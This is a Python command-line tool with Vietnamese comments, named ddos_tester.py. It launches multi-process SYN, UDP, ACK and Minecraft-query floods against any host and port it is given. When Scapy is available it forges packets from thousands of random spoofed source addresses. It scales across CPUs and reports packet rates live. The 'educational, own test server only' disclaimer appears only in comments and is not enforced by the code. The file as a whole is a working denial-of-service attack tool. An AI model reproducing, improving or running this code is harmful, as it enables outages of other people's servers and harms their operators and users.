#!/usr/bin/env python3
import sys
import os
import multiprocessing
import random
import time
import argparse
import logging
from datetime import datetime
import signal
import socket
import threading

# Try to import optional dependencies
try:
    import psutil
except ImportError:
    psutil = None
    print("psutil không được cài đặt. Chạy 'pip install psutil' để cài đặt.")
    # Continue without psutil (we'll handle this gracefully)

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Scapy không được cài đặt. Chạy 'pip install scapy' để cài đặt.")
    # Continue without scapy (we'll handle this gracefully)

try:
    from mcstatus import JavaServer
    MCSTATUS_AVAILABLE = True
except ImportError:
    MCSTATUS_AVAILABLE = False
    print("mcstatus không được cài đặt. Chạy 'pip install mcstatus' để cài đặt cho tấn công Query.")

# Tool kiểm thử mạng (SYN, UDP, ACK, Query Flood) tối ưu cho Replit/Termux/Linux (giáo dục)
# Chỉ chạy trên server thử nghiệm của bạn!
# Cách dùng: python3 ddos_tester.py --host <IP> --port <PORT> --processes <QUY_TRÌNH> --duration <GIÂY> [--log <FILE>] [--attack-ratio <SYN:UDP:ACK:QUERY>] [--batch-size <SỐ>] [--delay <GIÂY>]
# Ví dụ: python3 ddos_tester.py --host 127.0.0.1 --port 80 --processes 4 --duration 30 --log test.log --attack-ratio 40:30:20:10 --batch-size 100 --delay 0.01

class NetworkTester:
    def __init__(self, target_ip, target_port, processes, duration, log_file=None, attack_ratio="40:30:20:10", batch_size=100, delay=0.01):
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Determine number of processes based on available CPU or default to 2
        if psutil:
            self.processes = min(processes, psutil.cpu_count() or 2)
        else:
            self.processes = min(processes, 2)  # Default to 2 if psutil unavailable
            
        self.duration = duration
        self.batch_size = max(10, min(batch_size, 1000))  # Giới hạn batch size
        self.delay = max(0, min(delay, 1.0))  # Giới hạn delay
        self.packet_count = multiprocessing.Value('i', 0)
        self.query_count = multiprocessing.Value('i', 0)
        
        # Generate fake IPs (reduced for memory constraints on Replit)
        self.fake_ips = list({f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                             for _ in range(10000)})
        
        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 4 or sum(ratios) != 100:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.query_ratio = [r/100 for r in ratios]
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:QUERY, tổng=100 (ví dụ: 40:30:20:10)")

        # Thiết lập logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler(log_file) if log_file else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger()

        # Check if scapy is available
        if not SCAPY_AVAILABLE:
            self.logger.warning("Scapy không khả dụng. Sử dụng socket trực tiếp thay thế (hiệu suất thấp hơn).")
            
        # Check if mcstatus is available
        if not MCSTATUS_AVAILABLE:
            self.logger.warning("mcstatus không khả dụng, vô hiệu hóa Query Flood")
            self.query_ratio = 0
            self.syn_ratio += self.query_ratio / 3
            self.udp_ratio += self.query_ratio / 3
            self.ack_ratio += self.query_ratio / 3

        # Kiểm tra phần cứng nếu có psutil
        if psutil:
            ram = psutil.virtual_memory().total / (1024**3)  # GB
            if ram < 1:
                self.logger.warning("RAM thấp (<1GB). Có thể gây chậm hoặc crash.")
            if psutil.cpu_count() < 2:
                self.logger.warning("CPU yếu (<2 core). Hiệu suất sẽ thấp.")

    def send_syn_packet(self, src_ip):
        """Send SYN packet using raw socket (no root needed)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)  # Non-blocking
            s.settimeout(0.1)  # Short timeout
            s.connect_ex((self.target_ip, self.target_port))  # This sends SYN
            s.close()
            return True
        except:
            return False

    def send_udp_packet(self, src_ip):
        """Send UDP packet using socket (no root needed)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(os.urandom(64), (self.target_ip, self.target_port))
            s.close()
            return True
        except:
            return False

    def send_ack_packet(self, src_ip):
        """For ACK we need to simulate with a connection attempt"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)  # Non-blocking
            s.settimeout(0.1)  # Short timeout
            if s.connect_ex((self.target_ip, self.target_port)) == 0:
                # If connection succeeds, close it immediately
                s.close()
            return True
        except:
            return False

    def generate_and_send_packet_scapy(self, attack_type):
        """Generate and send packet using Scapy (if available)"""
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            
            if attack_type == "syn":
                packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000000))
            elif attack_type == "udp":
                packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)
            elif attack_type == "ack":
                packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1000, 9000000), ack=random.randint(1000, 9000000))
            else:
                return False
                
            send(packet, verbose=0)
            return True
        except Exception as e:
            self.logger.debug(f"Lỗi gửi gói Scapy: {e}")
            return False

    def generate_and_send_packet_socket(self, attack_type):
        """Generate and send packet using plain sockets (no root needed)"""
        src_ip = random.choice(self.fake_ips)
        
        if attack_type == "syn":
            return self.send_syn_packet(src_ip)
        elif attack_type == "udp":
            return self.send_udp_packet(src_ip)
        elif attack_type == "ack":
            return self.send_ack_packet(src_ip)
        return False

    def query_flood(self):
        """Gửi yêu cầu Query (L7)"""
        if MCSTATUS_AVAILABLE:
            try:
                server = JavaServer(self.target_ip, self.target_port)
                server.status(timeout=1)  # Timeout ngắn
                with self.query_count.get_lock():
                    self.query_count.value += 1
                return True
            except Exception as e:
                self.logger.debug(f"Lỗi Query Flood: {e}")
                return False
        else:
            return False

    def attack_process(self, stop_event):
        """Quy trình gửi gói SYN/UDP/ACK và Query"""
        try:
            success_count = 0
            while not stop_event.is_set():
                for _ in range(self.batch_size):
                    r = random.random()
                    success = False
                    
                    if r < self.syn_ratio:
                        if SCAPY_AVAILABLE:
                            success = self.generate_and_send_packet_scapy("syn")
                        else:
                            success = self.generate_and_send_packet_socket("syn")
                    elif r < self.syn_ratio + self.udp_ratio:
                        if SCAPY_AVAILABLE:
                            success = self.generate_and_send_packet_scapy("udp")
                        else:
                            success = self.generate_and_send_packet_socket("udp")
                    elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                        if SCAPY_AVAILABLE:
                            success = self.generate_and_send_packet_scapy("ack")
                        else:
                            success = self.generate_and_send_packet_socket("ack")
                    else:
                        success = self.query_flood()
                        
                    if success:
                        success_count += 1
                
                with self.packet_count.get_lock():
                    self.packet_count.value += success_count
                    success_count = 0
                
                if self.delay > 0:
                    time.sleep(self.delay)
        except MemoryError:
            self.logger.error("Hết bộ nhớ! Giảm --batch-size hoặc --processes.")
        except Exception as e:
            self.logger.error(f"Lỗi quy trình: {e}")

    def stats_process(self, stop_event):
        """Quy trình thống kê thời gian thực"""
        start_time = time.time()
        last_count = 0
        last_query = 0
        
        while not stop_event.is_set():
            try:
                time.sleep(1)
                with self.packet_count.get_lock(), self.query_count.get_lock():
                    current_count = self.packet_count.value
                    current_query = self.query_count.value
                    
                    # Calculate rates based on last second
                    packet_rate = current_count - last_count
                    query_rate = current_query - last_query
                    
                    # Update last counts
                    last_count = current_count
                    last_query = current_query
                    
                    elapsed = time.time() - start_time
                    
                    # Get CPU usage if available
                    cpu_usage = psutil.cpu_percent() if psutil else "N/A"
                    
                    # Format CPU usage differently depending on availability
                    cpu_info = f"CPU: {cpu_usage:.1f}%" if psutil else "CPU: N/A"
                    
                    self.logger.info(
                        f"Gói (SYN/UDP/ACK): {current_count:,} | "
                        f"Tốc độ: {packet_rate:,} gói/giây | "
                        f"Query: {current_query:,} | "
                        f"Tốc độ Query: {query_rate:,} query/giây | "
                        f"{cpu_info} | Thời gian: {elapsed:.1f}s"
                    )
            except Exception as e:
                self.logger.error(f"Lỗi thống kê: {e}")

    def run(self):
        """Chạy Network Tester"""
        self.logger.info(f"Bắt đầu kiểm thử đến {self.target_ip}:{self.target_port}")
        self.logger.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s")
        self.logger.info(f"Tỷ lệ tấn công: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% Query={self.query_ratio*100:.0f}%")
        self.logger.info(f"Thời điểm: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.logger.info(f"Sử dụng Scapy: {'Có' if SCAPY_AVAILABLE else 'Không'}")
        
        # Tạo stop event
        manager = multiprocessing.Manager()
        stop_event = manager.Event()
        
        # Khởi động quy trình thống kê
        stats = threading.Thread(target=self.stats_process, args=(stop_event,))
        stats.daemon = True
        stats.start()
        
        # Khởi động quy trình tấn công
        processes = []
        for i in range(self.processes):
            if i == 0:  # First process uses thread for better compatibility with Replit
                thread = threading.Thread(target=self.attack_process, args=(stop_event,))
                thread.daemon = True
                thread.start()
                processes.append(thread)
                self.logger.info(f"Khởi động thread tấn công 1/{self.processes}")
            else:
                proc = multiprocessing.Process(target=self.attack_process, args=(stop_event,))
                proc.daemon = True
                processes.append(proc)
                proc.start()
                self.logger.info(f"Khởi động quy trình {i+1}/{self.processes}")
        
        # Chờ thời gian chỉ định
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            self.logger.warning("Người dùng dừng chương trình...")
        
        # Dừng tất cả quy trình
        stop_event.set()
        
        # Join processes
        for proc in processes:
            if isinstance(proc, multiprocessing.Process):
                proc.join(timeout=5)
            else:  # threading.Thread
                proc.join(timeout=5)
        
        if isinstance(stats, threading.Thread):
            stats.join(timeout=5)
        
        # Báo cáo cuối
        with self.packet_count.get_lock(), self.query_count.get_lock():
            self.logger.info(f"Kết thúc! Tổng gói (SYN/UDP/ACK): {self.packet_count.value:,} | Tổng Query: {self.query_count.value:,}")
            self.logger.info(f"Thời điểm kết thúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    print("\n[!] Đang dừng chương trình...")
    sys.exit(0)

if __name__ == "__main__":
    # Xử lý tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cấu hình CLI
    parser = argparse.ArgumentParser(
        description="Công cụ kiểm thử mạng (SYN, UDP, ACK, Query Flood) tối ưu cho Replit/Termux/Linux (giáo dục). Chỉ chạy trên server thử nghiệm!",
        epilog="Ví dụ: python3 ddos_tester.py --host 127.0.0.1 --port 80 --processes 4 --duration 30 --log test.log --attack-ratio 40:30:20:10 --batch-size 100 --delay 0.01"
    )
    parser.add_argument("--host", required=True, help="IP server đích (ví dụ: 127.0.0.1)")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích (ví dụ: 80)")
    parser.add_argument("--processes", type=int, default=2, help="Số quy trình (mặc định: 2)")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian (giây, mặc định: 30)")
    parser.add_argument("--log", help="File log (ví dụ: test.log)")
    parser.add_argument("--attack-ratio", default="40:30:20:10", help="Tỷ lệ tấn công SYN:UDP:ACK:QUERY, tổng=100 (mặc định: 40:30:20:10)")
    parser.add_argument("--batch-size", type=int, default=100, help="Số gói mỗi lần gửi (mặc định: 100)")
    parser.add_argument("--delay", type=float, default=0.01, help="Độ trễ giữa các đợt gửi (giây, mặc định: 0.01)")
    
    args = parser.parse_args()
    
    try:
        tester = NetworkTester(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            log_file=args.log,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay
        )
        tester.run()
    except Exception as e:
        logging.error(f"Lỗi khởi động: {e}")
        sys.exit(1)
